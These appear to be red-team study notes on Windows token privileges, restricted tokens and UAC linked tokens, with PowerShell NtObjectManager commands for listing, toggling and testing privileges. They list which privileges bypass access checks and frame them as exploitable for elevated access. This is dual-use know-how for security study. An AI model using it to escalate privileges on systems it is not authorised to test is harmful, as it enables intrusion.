**Description** : This approach is essential for uncovering stealthy techniques used by sophisticated malware or for forensic analysis. It demonstrates the power of PowerShell in accessing low-level system details that are
not visible through standard tools.

**Privileges Overview** Privileges in Windows are granted to users to bypass certain security checks. They are critical for red teamers to understand as they can be exploited for elevated access. Privileges can be enabled or
disabled, and their state is crucial for their effectiveness. 

```powershell
PS> ls NtKeyUser:\SOFTWARE -Recurse | Where-Object Name -Match "`0"
```

**Using Get-NtTokenPrivilege**
This command lists the privileges of a token, showing their names, LUIDs, and whether they are enabled or disabled. This is useful for assessing the capabilities of a user or process.

```powershell
PS> Get-NtTokenPrivilege $token
```

### Modifying Token Privileges

* **Enabling/Disabling Privileges** : Using Enable-NtTokenPrivilege and Disable-NtTokenPrivilege, privileges
can be toggled. This is crucial for modifying access rights dynamically.
* **Removing Privileges** : Remove-NtTokenPrivilege completely removes a privilege from a token, preventing
its re-enabling.

**Privilege Checks**
This command checks if a specific privilege is enabled. It’s essential for verifying the operational status of a privilege before attempting actions that require it.

```powershell
PS> Test-NtTokenPrivilege SeChangeNotifyPrivilege
```

**Key Privileges**
* SeChangeNotifyPrivilege: Allows bypassing traverse checking.
* SeAssignPrimaryTokenPrivilege and SeImpersonatePrivilege: Bypass token assignment and impersonation
checks.
* SeBackupPrivilege and SeRestorePrivilege: Bypass access checks for backup and restore operations.
* SeDebugPrivilege: Bypasses access checks for opening process or thread objects.
* Other privileges like SeCreateTokenPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege,
SeTakeOwnershipPrivilege, and SeRelabelPrivilege oer various elevated capabilities.

**Restricted Tokens** Restricted tokens limit access to resources and are used in sandboxing mechanisms. They
are created using the NtFilterToken system call or CreateRestrictedToken API.

**Types of Restricted Tokens**

1. **Normal Restricted Tokens** : Limit access based on specified restricted SIDs.
2. **Write-Restricted Tokens** : Introduced in Windows XP SP2, these tokens prevent write access but allow
read and execute access, making them simpler but less secure sandboxes.
Creating and Analyzing Restricted Tokens
**Creating a Restricted Token** : Using Get-NtToken with ags like DisableMaxPrivileges, WriteRestricted, or specifying restricted SIDs.
**Properties of Restricted Tokens** : Checking properties like Restricted and WriteRestricted reveals the nature and limitations of the token.

**Use Cases and Limitations** Restricted tokens are essential for creating secure environments, like sandboxes in
web browsers, but they have limitations. For instance, a highly restricted token might not be able to access
necessary resources, limiting its practical use.


### Inspecting Executable Manifests
```powershell
PS> ls c:\windows\system32\*.exe | Get-ExecutableManifest
```

### Manual Elevation of Process
```powershell
PS> Start-Process notepad -Verb runas
```

### Accessing and Displaying Linked Tokens
#### For Full Token
```powershell
PS> Use-NtObject($token = Get-NtToken -Linked) {
Format-NtToken $token -Group -Privilege -Integrity -Information
}
````

#### For Limited Token
```powershell
PS> Use-NtObject($token = Get-NtToken) {
Format-NtToken $token -Group -Privilege -Integrity -Information
}
```

**Resources**
Windows Security Internals with PowerShell by James Forshaw
https://github.com/shakenetwork/PowerShell-Suite

<!-- cSpell:enable -->
